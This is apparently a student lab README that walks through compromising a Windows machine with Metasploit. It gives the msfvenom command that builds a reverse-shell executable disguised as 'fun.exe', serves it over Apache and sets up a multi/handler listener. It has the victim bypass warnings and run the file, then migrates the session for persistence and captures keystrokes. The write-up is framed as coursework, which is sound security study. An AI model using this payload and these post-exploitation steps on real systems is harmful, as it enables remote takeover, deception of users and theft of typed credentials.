# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/2dfb5089-7dd6-4763-b882-23d79b91b735" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/27faef5c-94ee-4a4d-bc34-94a9f1ecf0a3" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/710b1cc6-4e88-414f-9d4c-cea6b064d126" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/7ef649ed-76c1-4d53-b884-3db35a44be53" />


Check the status of apache2
## OUTPUT:
<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/3f33db25-bea8-469b-bc8f-e8ccac80f5b6" />


Invoke msfconsole:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/7aeb541e-34c9-4909-b68e-404944e861b2" />


<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/cd96e1ec-44c7-43f5-bd64-89134faaf706" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/6e4a3e0f-406d-4d47-a9a8-cdca9d7e52a1" />



Bypass any warning boxes, double-click the file, and allow it to run.



On kali/parrot give the command exploit
## OUTPUT:


<img width="1600" height="172" alt="image" src="https://github.com/user-attachments/assets/a9d0d530-91f4-4216-9a59-30b32fb7a2b9" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156




The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="1600" height="837" alt="image" src="https://github.com/user-attachments/assets/004a337e-e4ec-43ef-8dd4-7e0e5adb93ee" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="1600" height="157" alt="image" src="https://github.com/user-attachments/assets/4b120e8e-df3f-4667-9a40-4cede86241cf" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="1200" height="118" alt="image" src="https://github.com/user-attachments/assets/d368aee1-3458-48d4-879d-97ef38103c5a" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


